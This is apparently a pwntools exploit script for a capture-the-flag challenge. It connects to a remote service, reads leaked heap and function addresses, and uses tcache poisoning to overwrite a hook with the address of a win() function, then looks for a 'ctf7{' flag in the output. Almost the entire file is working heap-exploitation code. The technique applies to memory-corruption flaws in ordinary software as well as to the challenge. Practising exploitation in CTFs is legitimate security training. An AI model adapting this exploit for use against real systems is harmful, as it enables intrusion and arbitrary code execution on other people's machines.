#!/usr/bin/env python3
from pwn import *

io = remote('212.2.250.33', 32384)

banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

print(f"[+] heap: 0x{heap:x}, win: 0x{win:x}, hook: 0x{hook:x}")

# Tcache poisoning to write to hook
io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'A' * 32)
io.recvuntil(b'>')

io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'B' * 32)
io.recvuntil(b'>')

# Free both
io.sendline(b'3')
io.sendlineafter(b':', b'0')
io.recvuntil(b'>')

io.sendline(b'3')
io.sendlineafter(b':', b'1')
io.recvuntil(b'>')

# Poison tcache
io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', p64(hook))
io.recvuntil(b'>')

io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'C' * 32)
io.recvuntil(b'>')

# Write win to hook
io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', p64(win))
io.recvuntil(b'>')

# Try exiting - maybe hook is called on exit
print("[*] Triggering via exit...")
io.sendline(b'5')  # Exit option

output = io.recvall(timeout=2)
print("\n" + "="*60)
print(output.decode(errors='ignore'))
print("="*60)

if b'ctf7{' in output:
    flag = re.search(rb'ctf7\{[^}]+\}', output)
    if flag:
        print(f"\n[+] FLAG: {flag.group(0).decode()}")

io.close()
